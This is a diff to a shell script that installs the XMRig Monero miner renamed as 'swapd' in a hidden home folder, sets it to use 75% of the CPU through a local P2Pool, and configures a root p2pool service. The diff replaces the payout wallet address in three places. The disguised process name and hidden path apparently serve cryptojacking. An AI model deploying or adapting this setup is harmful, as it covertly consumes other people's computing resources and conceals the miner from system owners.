@@ -304,10 +304,10 @@ mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 # ======== XMRIG CONFIGURATION ========
 echo "[*] Reconfiguring XMRig for P2Pool..."
 sed -i 's/"url": *"[^"]*",/"url": "127.0.0.1:3333",/' $HOME/.swapd/config.json
-sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' $HOME/.swapd/config.json
+sed -i 's/"user": *"[^"]*",/"user": "437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q",/' $HOME/.swapd/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "x",/' $HOME/.swapd/config.json
 sed -i 's/"algo": *[^,]*,/"algo": "rx\/0",/' $HOME/.swapd/config.json
-#sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' $HOME/.swapd/config.json
+#sed -i 's/"user": *"[^"]*",/"user": "437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q",/' $HOME/.swapd/config.json
 #sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $HOME/.swapd/config.json
 #sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
@@ -568,7 +568,7 @@ ExecStart=/root/p2pool/p2pool \
   --host p2pmd.xmrvsbeast.com \
   --rpc-port 18081 \
   --rpc-ssl \
-  --wallet 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX \
+  --wallet 437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q \
   --stratum [::]:3333 \
   --p2p [::]:37889 \
   --loglevel 3 \
